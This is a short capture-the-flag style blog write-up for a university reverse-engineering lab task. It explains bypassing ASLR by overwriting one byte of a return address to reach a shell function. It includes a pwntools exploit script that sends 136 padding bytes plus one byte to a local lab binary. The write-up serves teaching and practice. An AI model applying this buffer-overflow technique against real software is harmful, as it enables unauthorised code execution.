---
layout: post
title:  UNIBUC_RE_lab_7_task_1
image: /assets/img/UNIBUC_RE.jpg
date:   2022-09-01 16:39:01
tags:
- pwn
description: ASLR challenge but functions are close to each other so you only need to replace 1 byte of the address
categories:
- UNIBUC RE
---

ASLR challenge but functions are close to each other so you only need to replace 1 byte of the address

As the description states you only need to replace one byte of return address to get to the shell function:

![](/assets/img/2022-09-02-15-24-31.png)

we need 0x40 as the last byte of the return address so our exploit is:

```
from pwn import *

from ctypes import *
e = ELF('./task01')

io=process('./task01')
gdb.attach(io,'break vuln')

io.send(136*b'x'+b'@')

io.interactive()

```
Note that we don't use sendline as it sends extra characters.